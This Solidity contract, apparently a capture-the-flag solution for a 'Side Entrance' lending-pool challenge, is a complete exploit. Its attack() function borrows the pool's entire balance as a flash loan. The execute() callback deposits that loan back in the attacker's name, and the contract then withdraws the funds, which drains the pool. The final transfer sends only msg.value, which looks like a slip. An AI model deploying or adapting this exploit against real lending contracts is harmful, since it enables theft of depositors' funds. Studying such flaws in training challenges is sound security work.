// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title AttackerContractSideEntrance
 * @author Juan Farber (github.com/Farber98)
 */

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackerContractSideEntrance {
    address public immutable sideEntranceLenderPool;

    constructor(address _sideEntranceLenderPool) {
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    // To receive the loan.
    fallback() external payable {}

    function attack() external payable {
        // Calls the loan.
        sideEntranceLenderPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                address(sideEntranceLenderPool).balance
            )
        );
        // After the loan has been ""repayed"", we will withdraw our funds.
        sideEntranceLenderPool.call(abi.encodeWithSignature("withdraw()"));
        // Transfer funds from this sc to the attacker.
        payable(msg.sender).transfer(msg.value);
    }

    function execute() external payable {
        // With the loan, deposit the funds in our name.
        sideEntranceLenderPool.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
    }
}
